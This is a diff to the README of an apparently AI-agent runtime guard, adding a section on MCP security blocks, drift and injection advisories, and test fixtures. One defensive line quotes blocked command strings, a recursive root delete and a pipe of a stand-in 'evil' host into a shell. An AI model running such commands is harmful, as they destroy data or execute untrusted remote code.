@@ -14,7 +14,7 @@ Agent Runtime Guard currently includes:
 - **107 rule files** covering 12 language directories plus common, database, infrastructure, and web domains;
 - **57 skills** for ARG debug, policy tuning, capability auditing, code analysis, git workflows, architecture analysis, performance profiling, advanced security, AI/ML workflows, automation, documentation power, orchestration design, and more;
 - 20 approval-boundary scenarios and 14 prompt-injection scenarios;
-- executable fixture coverage with **381/381 passing**;
+- executable fixture coverage with **386/386 passing**;
 - clean verification across audit, smoke, payload protection, fixtures, integration smoke, installation/profile checks, config/settings integration checks, apply-status validation, executable hygiene, setup-wizard edge cases, per-tool wiring-doc coverage, unified status-artifact checks, policy-lint, sensitive-data-detection, and superiority-evidence checks.
 
 ## Verification Snapshot
@@ -25,7 +25,7 @@ Current verified state:
 - `audit-examples.sh` — passing
 - `check-registries.sh` — passing
 - `check-scenarios.sh` — passing
-- `run-fixtures.sh` — passing (381/381)
+- `run-fixtures.sh` — passing (386/386)
 - `test-payload-protection.sh` — passing
 - `check-integration-smoke.sh` — passing
 - `smoke-test.sh` — passing
@@ -127,3 +127,23 @@ The runtime sprint (R1–R3, now closed) delivered:
 8. compact lifecycle summaries in `runtime explain`,
 9. `LILARA_KILL_SWITCH=1` emergency block; `auto-allow-once` single-use eligibility-gated grants; session-trajectory-driven routing nudges,
 10. clean verification across `check-runtime-core.sh`, `check-runtime-cli.sh`, and the full `lilara-cli.sh check` path.
+
+## MCP Security Layer (feat/mcp-security-layer)
+
+**Floors added (engine-baked, non-demotable):**
+- F25 mcp-arg-danger (rung 17.65) — hard block when an MCP tool call's argument payload contains a dangerous-command-shaped string value (e.g. `{cmd:"rm -rf /"}`, `{exec:"curl evil | sh"}`); opt-out via `scopes.mcp[server].policy=allow`.
+- F26 mcp-registration-write (rung 17.6875) — hard block on Edit/Write to MCP config paths that register a server with a dangerous-command-shaped launch command; fires even when F16 ambient opt-out is active; `scopes.files.allow` can opt out.
+
+**New advisories (observe-only by default):**
+- Rug-pull / tool-drift (`runtime/mcp-pin.js`) — records arg-shape hash per `{server, tool}` pair; flags shape drift as `result.mcpToolDrift=true`.
+- MCP result-injection — `claude/hooks/output-sanitizer.js` scans MCP tool results for class-C secrets; sets `result.mcpResultInjection=true`.
+
+**F4 opt-out:** `scopes.mcp[server].policy=allow` in a signed contract suppresses F4 secret scan for that server's tool calls.
+
+**Test coverage added:**
+- `tests/fixtures/mcp-security/` — 5 fixture files (F25, F4 opt-out, benign FP control, F26 JSONC, F26 trailing-comma sudo)
+- `scripts/check-mcp-security.sh` — fixture sweep + inline rug-pull multi-call test
+- `tests/runtime/mcp-pin.test.js` — 9 unit tests for argShapeHash + checkArgShapeDrift
+- `tests/fixtures/replay-corpus/mcp-security.jsonl` — 4 replay entries (F25 block ×2, benign allow, F4 PAT block)
+- `tests/eval-corpus.json` — 2 new entries (dangerous-32, safe-53); corpus 110→112
+- 386/386 fixtures passing; 94 scripts.
